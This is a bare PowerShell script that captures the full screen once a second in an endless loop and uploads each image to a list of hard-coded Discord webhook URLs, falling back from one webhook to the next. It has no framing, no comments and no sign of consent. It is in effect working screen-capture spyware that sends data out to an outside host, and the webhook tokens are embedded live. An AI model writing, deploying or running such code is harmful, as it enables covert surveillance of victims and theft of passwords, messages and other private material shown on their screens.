Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$webhooks = @(
    "https://discord.com/api/webhooks/1406003816142213152/u6XtfHXDpnx0wvc8IDfb0PpcGRXRoyVENJN7kQpH7rAtb60SwRErTsEW-mP_ctyv0D2w",
    "https://discord.com/api/webhooks/1406006916299362384/plq2qraPIHaOB0GKQzRY9e0-hXUndNlEQ8JY_zupIzl5ukF17u7TuWoNUBzepcF4DrMW",
    "https://discord.com/api/webhooks/1406006920053133323/lJ6UC7jp4rMdC-Nhsh1yqrO41jlYKelr1tcPf6OQ-EviYz_wyhj4uJ83n-PZfnIhassj",
    "https://discord.com/api/webhooks/1406006922624241766/MogYXK8vXO8n0R3c_Yart7MCOGwacIN6EXi6MOodQ4CKpEAo7C5n5kou4O72mxfelCLg",
    "https://discord.com/api/webhooks/1406006928609644574/cAeQtlYuy68S88DHwtPF8_vWMzwAh0A3kKcpARLb2wAUcvDYuxJtIRTBe51Sd6idB_L3",
    "https://discord.com/api/webhooks/1406006924125933600/wOWb0puaCkT5V_QPE30UR8QZp1CpsfTkh93HeqItNO54tr183-Df2i2ZcfJHL-20ZeT3",
    "https://discord.com/api/webhooks/1406006925379899514/rNxFXSUxHZQS5eIGs7vZoPHr9yQdg1e-VZ5eNQMyPAVR91bgwAfWcd29eLk1a-6F_M02"
)

$tempDir = Join-Path $env:TEMP "screenshots"
if (-not (Test-Path $tempDir)) {
    New-Item -Path $tempDir -ItemType Directory | Out-Null
}

while ($true) {
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"

    $bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)

    $filePath = Join-Path $tempDir "VirtualScreen.jpg"
    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Jpeg)

    $graphics.Dispose()
    $bitmap.Dispose()

    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
    $fileEnc = [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($fileBytes)

    $body = @(
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"VirtualScreen.jpg`"",
        "Content-Type: image/jpeg$LF",
        $fileEnc,
        "--$boundary--$LF"
    ) -join $LF

    $sent = $false
    foreach ($webhook in $webhooks) {
        try {
            Invoke-RestMethod -Uri $webhook -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body -TimeoutSec 5
            $sent = $true
            break
        } catch {
            Write-Host "Failed sending to $webhook, trying next..."
        }
    }

    if (-not $sent) {
        Write-Host "All webhooks failed for this frame."
    }

    Start-Sleep -Seconds 1
}
